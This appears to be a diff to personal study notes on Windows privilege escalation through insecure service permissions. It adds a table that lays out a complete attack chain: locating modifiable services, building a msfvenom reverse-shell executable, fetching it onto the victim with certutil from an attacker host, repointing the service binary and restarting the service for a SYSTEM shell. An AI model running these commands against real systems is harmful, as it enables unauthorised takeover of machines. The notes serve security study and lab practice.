@@ -8,6 +8,7 @@
 - Can't access sensitive files
 - Can't modify system settings
 - ==SYSTEM = highest privileges on Windows==
+- Administrator = lower then SYSTEM but higher then an user
 
 # 01: Service Exploits - Insecure Service Permissions
 
@@ -113,3 +114,16 @@ net start daclsvc
 C:\Windows\system32> whoami
 nt authority\system
 ```
+
+
+#### Short Summary
+
+| Step | Command | What it does |
+|---|---|---|
+| 1. Find vulnerable services | `accesschk.exe -uwcqv "Users" *` | Lists services you can modify |
+| 2. Check service details | `sc qc <service_name>` | Shows service configuration |
+| 3. Create payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` | Creates reverse shell |
+| 4. Upload payload | `certutil -urlcache -f http://<IP>/shell.exe C:\Temp\shell.exe` | Downloads file to victim |
+| 5. Modify service | `sc config <service> binpath= "C:\Temp\shell.exe"` | Points service to your shell |
+| 6. Start listener | `nc -lvnp 4444` | Waits for connection |
+| 7. Restart service | `net stop <service>` then `net start <service>` | Triggers your payload |
